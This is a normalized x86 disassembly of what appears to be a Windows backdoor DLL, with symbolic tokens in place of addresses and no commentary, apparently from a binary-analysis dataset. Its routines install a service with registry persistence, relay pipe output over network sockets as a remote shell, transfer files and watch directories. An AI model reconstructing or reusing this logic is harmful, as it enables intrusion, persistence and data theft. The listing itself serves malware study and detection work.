xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_7100316c
push ebp
mov ebp esp
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push esi
push edi
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
mov eax ecx
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
add eax 0xfffffff9
push eax
add ecx 0x7
push ecx
lea eax [ ebp - 0x10 ]
push eax
call [ strncpy@IAT ]
push r--data
push r--data
call [ fopen@IAT ]
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
push esi
call [ fprintf@IAT ]
push esi
call [ fclose@IAT ]
lea edi [ ebp - 0x10 ]
add esp 0x24
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ GetDiskFreeSpaceA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call esi
test eax eax
je r-xdata
push 0x2710
call [ Sleep@IAT ]
lea eax [ ebp - 0x114 ]
push 0x104
push eax
call [ _getcwd@IAT ]
mov esi [ _chdir@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call esi
call sub_71002470
lea eax [ ebp - 0x114 ]
push eax
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x10
pop edi
xor ecx ebp
pop esi
call sub_71006270
leave
retn
sub_71003263
push ebp
mov ebp esp
mov eax 0x202c
call sub_71006310
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
pop ebx
push ebx
call esi
push ebx
mov edi eax
call esi
push ebx
mov [ ebp - 0x4 ] eax
call esi
push ebx
mov [ ebp - 0xc ] eax
call esi
push ebx
mov [ ebp - 0x1c ] eax
call esi
push ebx
mov [ ebp - 0x10 ] eax
call esi
push ebx
xor esi esi
push esi
push edi
mov [ ebp - 0x8 ] eax
call memset
push ebx
push esi
push [ ebp - 0x4 ]
call memset
push ebx
push esi
push [ ebp - 0xc ]
call memset
push ebx
push esi
push [ ebp - 0x10 ]
call memset
add esp 0x48
push ebx
push esi
push [ ebp - 0x8 ]
call memset
mov esi [ ebp + 0x8 ]
mov eax esi
add esp 0xc
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
add esi 0x6
push esi
push edi
call [ strncpy@IAT ]
mov eax edi
add esp 0xc
xor ebx ebx
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
test eax eax
jle r-xdata
mov eax edi
lea esi [ ebx + 0x1 ]
lea ecx [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
mov ecx edi
sub edx edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
cmp esi eax
jge r-xdata
mov [ edx + ecx ] al
inc ebx
mov eax edi
mov [ ebp + 0x8 ] ebx
inc ecx
lea esi [ eax + 0x1 ]
mov eax edi
lea ecx [ esi + 0x1 ]
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xc ]
mov eax esi
sub eax ebx
lea ecx [ eax + ecx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
mov ebx [ ebp + 0x8 ]
sub eax esi
cmp ebx eax
jl r-xdata
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jge r-xdata
mov [ ecx ] al
mov eax edi
inc esi
inc ecx
lea edx [ eax + 0x1 ]
mov al [ ecx ]
cmp al 0x2d
je r-xdata
mov eax edi
lea esi [ ecx + 0x1 ]
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x10 ]
mov eax ecx
sub eax esi
lea esi [ eax + edx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp esi eax
jl r-xdata
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp esi eax
jge r-xdata
mov [ esi ] al
mov eax edi
inc ecx
inc esi
lea edx [ eax + 0x1 ]
mov al [ esi + edi ]
cmp al 0x2d
je r-xdata
push [ ebp - 0x4 ]
mov esi [ atoi@IAT ]
xor ebx ebx
call esi
push [ ebp - 0x8 ]
mov edi eax
call esi
pop ecx
pop ecx
push ebx
push 0x2000000
push 0x3
push ebx
push 0x5
push 0x1
push [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax esi
sub eax ecx
mov ecx [ ebp - 0x8 ]
lea ecx [ eax + ecx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jl r-xdata
push ebx
call [ ExitThread@IAT ]
imul edi edi 0x3e8
mov [ ebp - 0x28 ] edi
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp esi eax
jl r-xdata
mov al [ ecx + edi ]
cmp al 0x2d
je r-xdata
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x4 ] eax
jl r-xdata
mov eax [ ebp - 0x18 ]
dec eax
cmp eax 0x7fe
ja r-xdata
mov al [ esi + edi ]
mov [ ecx ] al
mov eax edi
inc esi
inc ecx
lea edx [ eax + 0x1 ]
push edi
call [ Sleep@IAT ]
mov esi 0x800
push esi
lea eax [ ebp - 0x202c ]
push ebx
push eax
call memset
add esp 0xc
push ebx
push ebx
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push esi
lea eax [ ebp - 0x202c ]
push eax
push [ ebp - 0x24 ]
mov [ ebp - 0x18 ] ebx
call ReadDirectoryChangesW
test eax eax
je r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
lea ebx [ ebp - 0x202c ]
add ebx [ ebx ]
cmp [ ebx ] 0x0
jne r-xdata
mov edi [ ebp - 0x1c ]
push 0x64
push 0x0
push edi
call memset
mov eax [ ebp - 0xc ]
add esp 0xc
lea esi [ eax + 0x1 ]
test [ ebx + 0x4 ] 0x1
je r-xdata
xor ebx ebx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push [ ebp - 0xc ]
push edi
call [ strncpy@IAT ]
add esp 0xc
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
and [ ebp - 0x8 ] 0x0
mov esi r--data
movsw [ edi ] [ esi ]
test [ ebx + 0x8 ] 0xfffffffe
jbe r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
call sub_71002c16
add [ ebp - 0x4 ] eax
mov edi [ ebp - 0x28 ]
pop ecx
pop ecx
lea eax [ ebx + 0xc ]
mov [ ebp + 0x8 ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x1c ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
add [ ebp + 0x8 ] 0x2
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
inc [ ebp - 0x8 ]
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
shr eax 0x1
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
mov [ ebp - 0x20 ] ax
xor ecx ecx
push ecx
xor eax eax
push ecx
lea edi [ ebp - 0x14 ]
stosw [ edi ]
push 0x3
stosb [ edi ]
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
push ecx
push ecx
mov [ ebp - 0x1e ] cx
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x14 ]
mov esi eax
InstallService
push ebp
sub esp 0x1f4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
push 0x50
mov eax sub_71006d8e
call sub_710063f8
mov eax [ ebp + 0x200 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x18 ] 0x80000002
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] r--data
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push esi
mov edi r--data
push edi
push [ ebp - 0x18 ]
call [ RegOpenKeyExA@IAT ]
cmp eax esi
mov [ ebp - 0x14 ] eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push esi
push r--data
push [ ebp - 0x18 ]
mov [ ebp - 0x50 ] 0x1f4
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call [ RegCloseKey@IAT ]
push [ ebp - 0x14 ]
call [ SetLastError@IAT ]
cmp [ ebp - 0x14 ] esi
je r-xdata
push eax
push edi
push r--data
call sub_71002fc7
add esp 0xc
mov [ ebp - 0x38 ] r--data
push r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
mov ebx [ strchr@IAT ]
lea edi [ ebp ]
mov [ ebp - 0x48 ] r--data
push r--data
lea eax [ ebp - 0x48 ]
jmp r-xdata
push r--data
call sub_71002fc7
pop ecx
lea edi [ ebp ]
push [ ebp - 0x1c ]
push edi
call [ _stricmp@IAT ]
test eax eax
pop ecx
pop ecx
je r-xdata
push eax
call _CxxThrowException
mov [ ebp - 0x2c ] r--data
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
push edi
push r--data
call sub_71002fc7
push esi
push edi
call ebx
add esp 0x10
inc eax
mov edi eax
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push esi
push edi
call ebx
pop ecx
inc eax
pop ecx
mov edi eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov edi 0xf003f
push edi
push esi
push esi
call [ OpenSCManagerA@IAT ]
cmp eax esi
mov [ ebp - 0x24 ] eax
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push esi
push esi
push esi
push esi
push esi
push r--data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push r--data
push [ ebp - 0x1c ]
push eax
call [ CreateServiceA@IAT ]
cmp eax esi
mov [ ebp - 0x28 ] eax
jne r-xdata
mov [ ebp - 0x4c ] r--data
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
push [ ebp - 0x1c ]
push r--data
call sub_71002fc7
mov ebx [ CloseServiceHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x28 ]
call ebx
push [ ebp - 0x24 ]
call ebx
push 0x1f4
lea eax [ ebp ]
push r--data
push eax
mov [ ebp - 0x18 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
push [ ebp - 0x1c ]
lea eax [ ebp ]
push eax
call [ strncat@IAT ]
add esp 0x18
lea eax [ ebp - 0x18 ]
push eax
push edi
push esi
lea eax [ ebp ]
push eax
push [ ebp - 0x18 ]
call [ RegOpenKeyExA@IAT ]
cmp eax esi
mov [ ebp - 0x14 ] eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
push r--data
call sub_71002fc7
add esp 0xc
mov [ ebp - 0x40 ] r--data
push r--data
lea eax [ ebp - 0x40 ]
jmp r-xdata
push 0x7
pop ecx
mov esi r--data
lea edi [ ebp ]
[ edi ] [ esi ]
lea eax [ ebp ]
movsb [ edi ] [ esi ]
lea edx [ eax + 0x1 ]
push eax
push [ ebp - 0x1c ]
push r--data
call sub_71002fc7
add esp 0xc
mov [ ebp - 0x54 ] r--data
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ RegSetValueExA@IAT ]
sub eax edx
inc eax
push eax
lea eax [ ebp ]
push eax
push 0x1
push 0x0
push r--data
push [ ebp - 0x18 ]
call edi
mov esi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x14 ] eax
call esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push r--data
push [ ebp - 0x18 ]
call [ RegCreateKeyA@IAT ]
push eax
mov [ ebp - 0x14 ] eax
call esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x30 ] r--data
push r--data
lea eax [ ebp - 0x30 ]
jmp r-xdata
push 0x1f4
lea eax [ ebp ]
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x34 ] r--data
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
lea eax [ ebp ]
lea edx [ eax + 0x1 ]
mov [ ebp - 0x3c ] r--data
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp ]
push eax
push 0x2
push 0x0
push r--data
push [ ebp - 0x20 ]
call edi
push eax
mov [ ebp - 0x14 ] eax
call esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push [ ebp - 0x1c ]
push r--data
call sub_71002fc7
pop ecx
pop ecx
push [ ebp - 0x18 ]
mov esi [ RegCloseKey@IAT ]
call esi
push [ ebp - 0x20 ]
call esi
push [ ebp - 0x28 ]
call ebx
push [ ebp - 0x24 ]
call ebx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x1f4 ]
xor ecx ebp
call sub_71006270
add ebp 0x1f8
leave
retn
mov [ ebp - 0x44 ] r--data
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
sub_710038e0
mov esi [ ebp - 0x5c ]
test esi esi
je r-xdata
mov eax r-xdata
retn
cmp [ esi ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
push esi
push r--data
mov [ ebp - 0x14 ] eax
call sub_71002fc7
add esp 0xc
UninstallService
push 0x1c
push r--data
call sub_71006294
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x20 ] r--data
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
push eax
push r--data
call sub_71002fc7
pop ecx
pop ecx
push 0x10000
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call [ OpenServiceA@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_710062d9
retn
push eax
call [ DeleteService@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
push eax
push [ ebp - 0x20 ]
push r--data
call sub_71002fc7
add esp 0xc
jmp r-xdata
mov [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
push r--data
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_71002fc7
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
push [ ebp - 0x2c ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x24 ]
call esi
sub_71003a63
push ebx
push esi
push edi
call sub_71001e53
mov esi [ esp + 0x14 ]
push 0x2000
push 0x0
push esi
call memset
mov eax rw-data
mov edx esi
add esp 0xc
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov ebx [ esp + 0x18 ]
push ebx
push [ esp + 0x14 ]
call sub_71003146
pop ecx
mov eax esi
pop ecx
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
mov edi eax
mov eax esi
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push ebx
push [ esp + 0x14 ]
sub eax ecx
add eax esi
push eax
call memcpy
add esp 0xc
lea eax [ edi + ebx ]
pop edi
pop esi
pop ebx
retn
sub_71003ad7
mov eax 0x400c
call sub_71006310
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4008 ] eax
push ebx
push esi
push edi
mov ebx 0x2000
push ebx
xor esi esi
lea eax [ esp + 0x18 ]
push esi
push eax
call memset
add esp 0xc
push esi
push esi
lea eax [ esp + 0x14 ]
push eax
mov edi 0x1fec
push edi
lea eax [ esp + 0x24 ]
push eax
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push 0x0
call [ ExitThread@IAT ]
pop edi
pop esi
pop ebx
push ebp
mov esi rw-data
mov ebp rw-data
push 0x5
call [ Sleep@IAT ]
push [ esp + 0x14 ]
lea eax [ esp + 0x201c ]
push eax
push [ rw-data ]
mov [ rw-data ] 0x0
call sub_71002f4a
add esp 0xc
cmp eax 0x1
jl r-xdata
push 0x32
call [ Sleep@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push edi
lea eax [ esp + 0x24 ]
push eax
push [ rw-data ]
call [ ReadFile@IAT ]
push ebx
push 0x0
push esi
call memset
push [ esp + 0x1c ]
lea eax [ esp + 0x28 ]
push eax
push esi
call memcpy
push [ esp + 0x28 ]
push ebp
push esi
call sub_71003a63
mov edi eax
push ebx
lea eax [ esp + 0x2040 ]
push 0x0
push eax
mov [ rw-data ] edi
call memset
push edi
lea eax [ esp + 0x204c ]
push ebp
push eax
call memcpy
push ebx
push 0x0
push esi
mov [ esp + 0x5c ] edi
call memset
add esp 0x48
push edi
push r--data
push esi
call [ sprintf@IAT ]
mov eax esi
add esp 0xc
lea edi [ eax + 0x1 ]
push edi
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
mov edi 0x1fec
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push ebp
push esi
call sub_71003a63
add esp 0xc
xor edi edi
push edi
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jge r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x18 ]
push eax
push edi
lea eax [ esp + 0x28 ]
push eax
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
pop ebp
cmp [ rw-data ] 0x0
je r-xdata
sub_71003cb1
push ebp
lea ebp [ esp - 0x2098 ]
mov eax 0x2248
call sub_71006310
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2094 ] eax
and [ ebp + 0x64 ] 0x0
push ebx
mov ebx [ ebp + 0x20a0 ]
push esi
push edi
push 0x64
mov [ ebp + 0x60 ] 0x12c
mov [ ebp + 0x83 ] 0x0
call [ malloc@IAT ]
push 0x64
push 0x0
push eax
mov [ ebp + 0x74 ] eax
call memset
add esp 0x10
push 0x3
xor eax eax
pop ecx
mov edi r--data
mov esi ebx
[ esi ] [ edi ]
mov eax ebx
jne r-xdata
lea edx [ eax + 0x1 ]
mov [ ebp + 0x83 ] 0x1
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax 0xfffffff7
add ebx 0x9
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
add eax 0xfffffff9
add ebx 0x7
jmp r-xdata
push rw-data
call [ atol@IAT ]
pop ecx
push eax
call htons
push rw-data
mov [ ebp + 0x86 ] ax
mov [ ebp + 0x84 ] 0x2
call inet_addr
mov [ ebp + 0x88 ] eax
push 0x10
lea eax [ ebp + 0x84 ]
push eax
push [ ebp + 0x78 ]
call connect
mov esi 0x2000
push esi
push 0x0
push rw-data
mov edi eax
call memset
push esi
push 0x0
mov ebx rw-data
push ebx
call memset
add esp 0x18
test edi edi
mov eax rw-data
je r-xdata
push 0x0
push eax
push ebx
push [ ebp + 0x74 ]
call [ strncpy@IAT ]
add esp 0xc
push 0x0
push 0x1
push 0x2
call socket
cmp eax 0xffffffff
mov [ ebp + 0x78 ] eax
jne r-xdata
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
mov esi rw-data
push esi
call sub_71003a63
push eax
push ebx
push [ ebp + 0x78 ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push rw-data
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
mov edi 0x2000
push edi
push 0x0
push esi
call memset
push edi
xor edi edi
push edi
push ebx
call memset
add esp 0x18
cmp [ ebp + 0x83 ] 0x1
jne r-xdata
push 0x0
push [ ebp + 0x78 ]
call shutdown
push [ ebp + 0x74 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
push 0x0
push [ rw-data ]
call shutdown
push [ rw-data ]
cmp [ ebp + 0x83 ] 0x0
jne r-xdata
push edi
push 0x80
push 0x2
push edi
push edi
push 0x40000000
push [ ebp + 0x74 ]
call [ CreateFileA@IAT ]
cmp eax edi
mov [ ebp + 0x7c ] eax
je r-xdata
call closesocket
push [ ebp + 0x78 ]
call closesocket
push [ ebp + 0x74 ]
call [ free@IAT ]
pop ecx
push edi
jmp r-xdata
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
push [ ebp + 0x74 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x7c ] eax
je r-xdata
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax rw-data
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov ecx [ rw-data ]
cmp ecx edi
mov [ ebp + 0x6c ] edi
mov [ ebp + 0x70 ] edi
jg r-xdata
call [ ExitThread@IAT ]
push 0x7
pop ecx
mov esi r--data
mov edi rw-data
mov eax rw-data
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
lea ecx [ ebp + 0x5c ]
push ecx
push eax
call [ GetFileSize@IAT ]
mov ecx [ rw-data ]
cmp ecx edi
mov esi [ ebp + 0x5c ]
mov [ ebp + 0x58 ] eax
mov [ ebp + 0x6c ] eax
jg r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push rw-data
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jl r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
jmp r-xdata
xor esi esi
push esi
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
jmp r-xdata
mov edi [ ebp + 0x78 ]
xor esi esi
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
jmp r-xdata
and eax ecx
cmp eax 0xffffffff
je r-xdata
cmp eax edi
ja r-xdata
sub eax esi
push eax
push ebx
push rw-data
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
push 0x64
call [ Sleep@IAT ]
push esi
push [ ebp + 0x6c ]
mov esi rw-data
push r--data
push esi
call [ sprintf@IAT ]
mov eax esi
add esp 0x10
lea edi [ eax + 0x1 ]
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp + 0x78 ]
call shutdown
push [ ebp + 0x78 ]
mov edx eax
or edx ecx
je r-xdata
cmp eax edi
ja r-xdata
mov ecx [ ebp + 0x2094 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71006270
add ebp 0x2098
leave
retn
mov [ rw-data ] esi
mov [ rw-data ] esi
jmp r-xdata
push 0xc8
call [ Sleep@IAT ]
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
cmp eax esi
je r-xdata
push [ ebp + 0x78 ]
jmp r-xdata
push 0xc8
call [ Sleep@IAT ]
mov ecx [ rw-data ]
test ecx ecx
jl r-xdata
and eax ecx
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
or [ rw-data ] 0xffffffff
mov [ rw-data ] 0xfffffffe
xor edi edi
push 0x0
push [ rw-data ]
call shutdown
push [ rw-data ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push ebx
push esi
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
sub [ ebp + 0x6c ] eax
sbb esi ecx
and eax ecx
cmp eax 0xffffffff
mov [ ebp + 0x70 ] esi
jne r-xdata
and eax ecx
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
lea eax [ ebp - 0xac ]
push eax
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ rw-data ]
jg r-xdata
call closesocket
mov eax [ ebp + 0x6c ]
or eax [ ebp + 0x70 ]
je r-xdata
push 0x0
push [ rw-data ]
call shutdown
push [ rw-data ]
push 0x32
call [ Sleep@IAT ]
mov ecx [ rw-data ]
test ecx ecx
jl r-xdata
mov eax [ ebp + 0x6c ]
add eax [ ebp + 0x68 ]
adc [ ebp + 0x70 ] esi
cmp eax [ rw-data ]
mov [ ebp + 0x6c ] eax
jne r-xdata
push esi
push 0x2000
lea eax [ ebp + 0x94 ]
push eax
push edi
call recv
cmp eax esi
mov [ ebp + 0x74 ] eax
push esi
jle r-xdata
mov eax [ rw-data ]
test eax eax
jbe r-xdata
push 0x3e8
call [ Sleep@IAT ]
xor edi edi
push edi
push [ rw-data ]
push [ rw-data ]
push [ ebp + 0x7c ]
call sub_710030bc
mov esi [ ebp + 0x78 ]
add esp 0x10
or [ rw-data ] 0xffffffff
mov [ rw-data ] 0xfffffffe
jmp r-xdata
mov eax [ rw-data ]
jg r-xdata
cmp [ ebp + 0x74 ] esi
jg r-xdata
mov eax [ ebp + 0x70 ]
cmp eax [ rw-data ]
je r-xdata
push edi
call shutdown
push edi
call closesocket
jmp r-xdata
lea eax [ ebp + 0x68 ]
push eax
push [ ebp + 0x74 ]
lea eax [ ebp + 0x94 ]
push eax
push [ ebp + 0x7c ]
call [ WriteFile@IAT ]
jmp r-xdata
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
jmp r-xdata
cmp eax edi
je r-xdata
mov eax [ rw-data ]
test eax eax
jbe r-xdata
lea eax [ ebp + 0x60 ]
push eax
push esi
push esi
lea eax [ ebp - 0xac ]
push eax
push esi
mov [ ebp + 0x74 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] 0x1
call select
cmp eax 0xffffffff
je r-xdata
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax rw-data
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
cmp [ ebp + 0x68 ] edi
jne r-xdata
lea eax [ ebp - 0x1b0 ]
push eax
push esi
call __WSAFDIsSet
test eax eax
je r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push rw-data
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
lea eax [ ebp + 0x60 ]
push eax
push edi
lea eax [ ebp - 0x1b0 ]
push eax
push edi
push edi
mov [ ebp - 0x1ac ] esi
mov [ ebp - 0x1b0 ] 0x1
call select
cmp eax 0xffffffff
je r-xdata
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
jmp r-xdata
push edi
lea eax [ ebp + 0x68 ]
push eax
push 0x2000
lea eax [ ebp + 0x94 ]
push eax
push [ ebp + 0x7c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor esi esi
push esi
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push [ ebp + 0x7c ]
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x64
call [ Sleep@IAT ]
push [ ebp + 0x78 ]
call closesocket
mov esi 0x2000
push esi
push 0x0
push rw-data
mov [ rw-data ] 0x0
call memset
push esi
push 0x0
push ebx
call memset
mov esi r--data
mov edi rw-data
